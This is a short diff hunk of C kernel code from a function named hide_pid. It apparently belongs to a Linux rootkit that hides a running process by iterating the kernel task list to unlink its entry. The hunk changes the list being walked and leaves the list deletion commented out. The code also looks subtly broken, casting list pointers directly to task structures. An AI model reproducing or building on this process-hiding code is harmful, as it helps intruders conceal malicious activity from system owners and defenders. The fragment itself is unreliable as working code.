@@ -84,7 +84,7 @@ hide_pid(pid_t pid)
     rcu_read_unlock();
 
     write_lock_irq(rwlock);
-    list_for_each_safe(pos, q, &mylist.tasks){
+    list_for_each_safe(pos, q, &ts.tasks){
         tmp= list_entry(pos, struct task_struct, tasks);
         if (((struct task_struct *)pos) == ((struct task_struct *)ts)) {
             /* list_del(pos); */
